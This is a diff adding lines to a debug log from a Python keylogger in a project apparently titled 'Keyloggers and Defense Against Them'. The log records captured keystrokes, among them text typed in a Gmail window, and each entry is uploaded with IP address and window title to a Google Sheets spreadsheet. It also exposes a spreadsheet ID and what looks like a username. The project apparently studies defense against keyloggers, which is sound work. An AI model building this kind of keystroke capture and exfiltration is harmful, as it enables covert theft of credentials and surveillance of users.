@@ -344,3 +344,144 @@ TypeError: must be str, not NoneType
 2023-04-12 20:20:16,592 
 2023-04-12 20:20:17,128 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
 2023-04-12 20:20:21,143 y
+2023-04-12 22:14:30,838 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-12 22:14:30,843 Making request: POST https://oauth2.googleapis.com/token
+2023-04-12 22:14:30,851 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-12 22:14:39,135 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-12 22:14:39,143 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-12 22:15:08,023 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 22:15:08,699 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 22:16:53,495 hello
+2023-04-12 22:16:53,504 Resetting dropped connection: sheets.googleapis.com
+2023-04-12 22:16:54,434 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-12 22:16:54,436 Added row: ['hello', '2023-04-12 22:16:53', '192.168.56.1', 'New Tab - Brave']
+2023-04-12 22:22:59,494 y
+2023-04-13 14:43:23,474 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-13 14:43:23,478 Making request: POST https://oauth2.googleapis.com/token
+2023-04-13 14:43:23,484 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-13 14:43:24,319 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-13 14:43:24,324 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-13 14:43:25,161 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 14:43:25,587 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 14:44:00,341 
+2023-04-13 14:44:00,954 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 14:44:00,955 Added row: ['\x03', '2023-04-13 14:44:00', '192.168.56.1', 'antikeylog.py - Keyloggers and Defense Against Them - Visual Studio Code']
+2023-04-13 14:44:29,114 y
+2023-04-13 15:16:12,168 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-13 15:16:12,173 Making request: POST https://oauth2.googleapis.com/token
+2023-04-13 15:16:12,181 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-13 15:16:13,469 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-13 15:16:13,478 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-13 15:16:14,331 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 15:16:14,704 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 15:16:18,474 g
+2023-04-13 15:16:19,059 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 15:16:19,062 Added row: ['\x0eg', '2023-04-13 15:16:18', '192.168.56.1', 'New Private Tab - Brave']
+2023-04-13 15:16:27,899 aviraljain5
+2023-04-13 15:16:29,590 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 15:16:29,594 Added row: ['aviraljain5', '2023-04-13 15:16:27', '192.168.56.1', 'Gmail - Brave']
+2023-04-13 15:16:34,234 hello
+2023-04-13 15:16:34,915 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 15:16:34,917 Added row: ['hello', '2023-04-13 15:16:34', '192.168.56.1', 'Gmail - Brave']
+2023-04-13 15:17:26,700 hello
+2023-04-13 15:17:27,241 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 15:17:27,243 Added row: ['hello', '2023-04-13 15:17:26', '192.168.56.1', 'logger.py - Keyloggers and Defense Against Them - Visual Studio Code']
+2023-04-13 15:30:22,292 
+2023-04-13 15:30:22,296 Resetting dropped connection: sheets.googleapis.com
+2023-04-13 15:30:24,566 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 15:30:24,567 Added row: ['\x03', '2023-04-13 15:30:22', '192.168.56.1', 'antikeylog.py - Keyloggers and Defense Against Them - Visual Studio Code']
+2023-04-13 15:30:47,369 y
+2023-04-13 21:36:07,579 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-13 21:36:07,581 Making request: POST https://oauth2.googleapis.com/token
+2023-04-13 21:36:07,583 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-13 21:36:08,100 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-13 21:36:08,102 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-13 21:36:09,137 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 21:36:09,575 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 21:37:04,683 Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "_util\__init__.py", line 228, in inner
+  File "keyboard\_win32.py", line 287, in _process
+  File "_util\__init__.py", line 144, in inner
+  File "keylogs.py", line 104, in on_press
+TypeError: must be str, not NoneType
+2023-04-13 21:37:36,166 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-13 21:37:36,167 Making request: POST https://oauth2.googleapis.com/token
+2023-04-13 21:37:36,169 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-13 21:37:36,847 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-13 21:37:36,849 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-13 21:37:37,329 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 21:37:37,714 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 21:39:27,845 y
+2023-04-13 21:40:36,876 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-13 21:40:36,878 Making request: POST https://oauth2.googleapis.com/token
+2023-04-13 21:40:36,880 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-13 21:40:37,405 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-13 21:40:37,407 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-13 21:40:37,911 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 21:40:38,287 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 21:41:25,140 b
+2023-04-13 21:41:25,822 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 21:41:59,703 0
+2023-04-13 21:42:00,175 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 21:42:15,697 y
+2023-04-13 21:42:16,183 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 21:42:16,183 Added row: ['y', '2023-04-13 21:42:15', '192.168.56.1', 'gui.py - Keyloggers and Defense Against Them - Visual Studio Code']
+2023-04-13 21:44:52,992 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-13 21:44:52,993 Making request: POST https://oauth2.googleapis.com/token
+2023-04-13 21:44:52,996 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-13 21:44:53,487 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-13 21:44:53,488 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-13 21:44:54,085 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 21:44:54,473 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 21:46:20,829 1
+2023-04-13 21:46:21,349 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 21:46:21,349 Added row: ['1\x13', '2023-04-13 21:46:20', '192.168.56.1', 'gui.py - Keyloggers and Defense Against Them - Visual Studio Code']
+2023-04-13 21:47:29,874 Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "_util\__init__.py", line 228, in inner
+  File "keyboard\_win32.py", line 287, in _process
+  File "_util\__init__.py", line 144, in inner
+  File "keylogs.py", line 104, in on_press
+TypeError: must be str, not NoneType
+2023-04-13 21:47:43,642 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-13 21:47:43,644 Making request: POST https://oauth2.googleapis.com/token
+2023-04-13 21:47:43,647 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-13 21:47:44,450 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-13 21:47:44,452 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-13 21:47:45,140 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 21:47:45,593 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 21:48:45,858 0
+2023-04-13 21:48:46,576 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 21:49:29,748 
+2023-04-13 21:49:30,237 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 21:49:39,269 re
+2023-04-13 21:49:39,804 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 21:51:36,816 Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "_util\__init__.py", line 228, in inner
+  File "keyboard\_win32.py", line 287, in _process
+  File "_util\__init__.py", line 144, in inner
+  File "keylogs.py", line 104, in on_press
+TypeError: must be str, not NoneType
+2023-04-13 21:53:05,976 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-13 21:53:05,977 Making request: POST https://oauth2.googleapis.com/token
+2023-04-13 21:53:05,979 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-13 21:53:06,472 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-13 21:53:06,475 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-13 21:53:07,221 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 21:53:07,597 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 21:56:22,491 
+2023-04-13 21:56:23,030 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 21:56:23,030 Added row: ['\x13\x1a\x1a\x1a\x1a\x19\x13', '2023-04-13 21:56:22', '192.168.56.1', 'gui.py - Keyloggers and Defense Against Them - Visual Studio Code']
+2023-04-13 21:56:25,283 pri
+2023-04-13 21:56:25,752 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 21:56:30,626 (
+2023-04-13 21:56:31,019 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-13 21:59:37,166 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-13 21:59:37,169 Making request: POST https://oauth2.googleapis.com/token
+2023-04-13 21:59:37,173 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-13 21:59:37,765 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-13 21:59:37,768 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-13 21:59:38,481 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-13 21:59:38,869 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
